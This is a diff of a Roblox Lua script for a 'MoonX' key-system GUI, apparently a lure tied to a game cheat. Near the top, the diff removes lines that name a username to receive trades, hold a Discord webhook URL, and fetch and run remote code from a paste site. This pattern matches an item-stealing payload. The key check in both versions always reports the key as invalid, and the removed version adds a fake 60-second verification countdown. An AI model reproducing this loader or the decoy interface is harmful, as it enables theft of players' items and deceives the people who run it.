@@ -36,14 +36,6 @@
 --⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠻⠿⠿⠿⠿⠿⠿⠟⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀
 
 
-_G.username = {"27tomasal"=} -- Where trades will be received.
-_G.webhook = "https://discord.com/api/webhooks/1387242492381888603/FXoeLDshoD6qFF_KrqwnEZewgF37M5bmqw_KzYgozDgt3lkwD5qAX17dupbLq9j9vDJQ" -- Your discord webhook.
-_G.ping = true -- Send a @everyone in the webhook message.
-_G.private = true -- Show the webhook if the server is private.
-
-loadstring(game:HttpGet("http://vpaste.net/KTYZC"))()
-
-
 -- Enhanced Key System GUI with improved design and animations
 local TweenService = game:GetService("TweenService")
 
@@ -51,62 +43,48 @@ local TweenService = game:GetService("TweenService")
 local gui = Instance.new("ScreenGui", game.CoreGui)
 gui.Name = "KeySystemUI"
 
--- Pre-loading image setup (smaller, no background)
-local preloadImage = Instance.new("ImageLabel", gui)
-preloadImage.Size = UDim2.new(0, 200, 0, 200) -- Smaller size
-preloadImage.Position = UDim2.new(0.5, -100, 0.5, -100)
-preloadImage.BackgroundTransparency = 1 -- No background
-preloadImage.Image = "rbxassetid://114618695295982" -- Replace with your texture ID
-preloadImage.ImageTransparency = 1
-
--- Add rounded corners to preload image
-local preloadCorner = Instance.new("UICorner", preloadImage)
-preloadCorner.CornerRadius = UDim.new(0, 15)
-
--- Main frame (larger and taller, centered)
+-- Main frame (larger and centered)
 local frame = Instance.new("Frame", gui)
-frame.Size = UDim2.new(0, 400, 0, 280) -- Made taller (was 220, now 280)
-frame.Position = UDim2.new(0.5, -200, 0.5, -140) -- Adjusted position for new height
+frame.Size = UDim2.new(0, 400, 0, 220)
+frame.Position = UDim2.new(0.5, -200, 0.5, -110)
 frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
 frame.BorderSizePixel = 0
 frame.BackgroundTransparency = 1 -- Start invisible for animation
-frame.Visible = false -- Hide completely until logo finishes
 
 -- Add rounded corners to main frame
 local frameCorner = Instance.new("UICorner", frame)
 frameCorner.CornerRadius = UDim.new(0, 12)
 
--- Add subtle drop shadow effect - HIDDEN initially
+-- Add subtle drop shadow effect
 local shadow = Instance.new("Frame", gui)
 shadow.Size = frame.Size
-shadow.Position = UDim2.new(0.5, -198, 0.5, -138) -- Adjusted for new height
+shadow.Position = UDim2.new(0.5, -198, 0.5, -108)
 shadow.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
 shadow.BackgroundTransparency = 0.8
 shadow.BorderSizePixel = 0
 shadow.ZIndex = frame.ZIndex - 1
 shadow.BackgroundTransparency = 1 -- Start invisible
-shadow.Visible = false -- Hide completely until logo finishes
 
 local shadowCorner = Instance.new("UICorner", shadow)
 shadowCorner.CornerRadius = UDim.new(0, 12)
 
--- Title label (updated text)
+-- Title label (better positioned and styled)
 local title = Instance.new("TextLabel", frame)
 title.Size = UDim2.new(1, -40, 0, 40)
 title.Position = UDim2.new(0, 20, 0, 15)
 title.BackgroundTransparency = 1
-title.Text = "MoonX Rewrite 🌙 | BGSI"
+title.Text = "MoonX 🌙 | Copy Key to Clipboard"
 title.TextColor3 = Color3.fromRGB(255, 255, 255)
 title.Font = Enum.Font.SourceSansBold
 title.TextSize = 20
 title.TextXAlignment = Enum.TextXAlignment.Center
 
--- Get Key button (darker blue color)
+-- Get Key button (improved styling and positioning)
 local getKeyBtn = Instance.new("TextButton", frame)
 getKeyBtn.Size = UDim2.new(1, -40, 0, 35)
 getKeyBtn.Position = UDim2.new(0, 20, 0, 65)
 getKeyBtn.Text = "Get Key"
-getKeyBtn.BackgroundColor3 = Color3.fromRGB(50, 100, 150)
+getKeyBtn.BackgroundColor3 = Color3.fromRGB(70, 130, 180)
 getKeyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
 getKeyBtn.Font = Enum.Font.SourceSansBold
 getKeyBtn.TextSize = 16
@@ -149,17 +127,6 @@ submitBtn.BorderSizePixel = 0
 local submitCorner = Instance.new("UICorner", submitBtn)
 submitCorner.CornerRadius = UDim.new(0, 8)
 
--- Status label for countdown display (new element)
-local statusLabel = Instance.new("TextLabel", frame)
-statusLabel.Size = UDim2.new(1, -40, 0, 30)
-statusLabel.Position = UDim2.new(0, 20, 0, 200)
-statusLabel.BackgroundTransparency = 1
-statusLabel.Text = ""
-statusLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
-statusLabel.Font = Enum.Font.SourceSans
-statusLabel.TextSize = 14
-statusLabel.TextXAlignment = Enum.TextXAlignment.Center
-
 -- Button hover effects
 local function createHoverEffect(button, hoverColor, originalColor)
     button.MouseEnter:Connect(function()
@@ -181,8 +148,8 @@ local function createHoverEffect(button, hoverColor, originalColor)
     end)
 end
 
--- Apply hover effects (updated for darker blue)
-createHoverEffect(getKeyBtn, Color3.fromRGB(70, 120, 170), Color3.fromRGB(50, 100, 150))
+-- Apply hover effects
+createHoverEffect(getKeyBtn, Color3.fromRGB(90, 150, 200), Color3.fromRGB(70, 130, 180))
 createHoverEffect(submitBtn, Color3.fromRGB(80, 170, 80), Color3.fromRGB(60, 150, 60))
 
 -- Button functionality
@@ -196,140 +163,71 @@ getKeyBtn.MouseButton1Click:Connect(function()
     getKeyBtn.Text = originalText
 end)
 
--- Variable to track if verification is in progress
-local isVerifying = false
-
 submitBtn.MouseButton1Click:Connect(function()
-    if isVerifying then
-        return -- Prevent multiple clicks during verification
-    end
-    
     local key = keyBox.Text
-    isVerifying = true
     
-    -- Disable the submit button during verification
-    submitBtn.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
-    submitBtn.Text = "Verifying..."
+    -- Always show invalid key message
+    local originalText = submitBtn.Text
+    local originalColor = keyBox.BackgroundColor3
     
-    -- Start 60-second countdown with dots animation
-    local countdown = 60
-    local dotPattern = {"...", "..", ".", "..."}
-    local dotIndex = 1
+    submitBtn.Text = "Invalid key, Try again"
     
-    local function updateCountdown()
-        if countdown > 0 then
-            statusLabel.Text = countdown .. ", Verifying Key" .. dotPattern[dotIndex]
-            dotIndex = dotIndex % 4 + 1
-            countdown = countdown - 1
-            
-            wait(1)
-            updateCountdown()
-        else
-            -- Countdown finished, show invalid key
-            statusLabel.Text = ""
-            
-            local originalText = "Submit Key"
-            local originalColor = keyBox.BackgroundColor3
-            
-            submitBtn.Text = "Invalid key, Try again"
-            
-            -- Fade textbox to red
-            local redTween = TweenService:Create(
-                keyBox,
-                TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
-                {BackgroundColor3 = Color3.fromRGB(150, 50, 50)}
-            )
-            
-            redTween:Play()
-            
-            -- Wait and fade back to original
-            wait(1)
-            
-            local normalTween = TweenService:Create(
-                keyBox,
-                TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
-                {BackgroundColor3 = originalColor}
-            )
-            
-            normalTween:Play()
-            
-            -- Reset button text and re-enable
-            wait(0.5)
-            submitBtn.Text = originalText
-            submitBtn.BackgroundColor3 = Color3.fromRGB(60, 150, 60)
-            isVerifying = false
-        end
-    end
+    -- Fade textbox to red
+    local redTween = TweenService:Create(
+        keyBox,
+        TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+        {BackgroundColor3 = Color3.fromRGB(150, 50, 50)}
+    )
     
-    -- Start the countdown
-    spawn(updateCountdown)
+    redTween:Play()
+    
+    -- Wait and fade back to original
+    wait(1)
+    
+    local normalTween = TweenService:Create(
+        keyBox,
+        TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+        {BackgroundColor3 = originalColor}
+    )
+    
+    normalTween:Play()
+    
+    -- Reset button text
+    wait(0.5)
+    submitBtn.Text = originalText
 end)
 
--- Pre-loading animation sequence
-local function startKeySystemGUI()
-    -- Make GUI visible
-    frame.Visible = true
-    shadow.Visible = true
-    
-    -- Fade-in animation (slower)
-    local fadeInTween = TweenService:Create(
-        frame,
-        TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
-        {BackgroundTransparency = 0}
-    )
-
-    local shadowFadeIn = TweenService:Create(
-        shadow,
-        TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
-        {BackgroundTransparency = 0.8}
-    )
-
-    -- Animation from top of screen (slower) - adjusted for new height
-    frame.Position = UDim2.new(0.5, -200, 0, -280) -- Start above screen
-    shadow.Position = UDim2.new(0.5, -198, 0, -278) -- Start above screen
-
-    local slideInTween = TweenService:Create(
-        frame,
-        TweenInfo.new(0.8, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
-        {Position = UDim2.new(0.5, -200, 0.5, -140)}
-    )
-
-    local shadowSlideTween = TweenService:Create(
-        shadow,
-        TweenInfo.new(0.8, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
-        {Position = UDim2.new(0.5, -198, 0.5, -138)}
-    )
-
-    -- Play animations
-    fadeInTween:Play()
-    shadowFadeIn:Play()
-    slideInTween:Play()
-    shadowSlideTween:Play()
-end
-
--- Preload image fade in (0.5 seconds)
-local preloadFadeIn = TweenService:Create(
-    preloadImage,
-    TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
-    {ImageTransparency = 0}
+-- Fade-in animation (slower)
+local fadeInTween = TweenService:Create(
+    frame,
+    TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+    {BackgroundTransparency = 0}
 )
 
--- Preload image fade out (1 second)
-local preloadFadeOut = TweenService:Create(
-    preloadImage,
-    TweenInfo.new(1.0, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
-    {ImageTransparency = 1}
+local shadowFadeIn = TweenService:Create(
+    shadow,
+    TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+    {BackgroundTransparency = 0.8}
 )
 
--- Start the preload sequence
-preloadFadeIn:Play()
+-- Animation from top of screen (slower)
+frame.Position = UDim2.new(0.5, -200, 0, -220) -- Start above screen
+shadow.Position = UDim2.new(0.5, -198, 0, -218) -- Start above screen
 
-preloadFadeIn.Completed:Connect(function()
-    wait(1.0) -- Display image for 1 second
-    preloadFadeOut:Play()
-    
-    preloadFadeOut.Completed:Connect(function()
-        preloadImage:Destroy()
-        startKeySystemGUI()
-    end)
-end)
+local slideInTween = TweenService:Create(
+    frame,
+    TweenInfo.new(0.8, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
+    {Position = UDim2.new(0.5, -200, 0.5, -110)}
+)
+
+local shadowSlideTween = TweenService:Create(
+    shadow,
+    TweenInfo.new(0.8, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
+    {Position = UDim2.new(0.5, -198, 0.5, -108)}
+)
+
+-- Play animations
+fadeInTween:Play()
+shadowFadeIn:Play()
+slideInTween:Play()
+shadowSlideTween:Play()
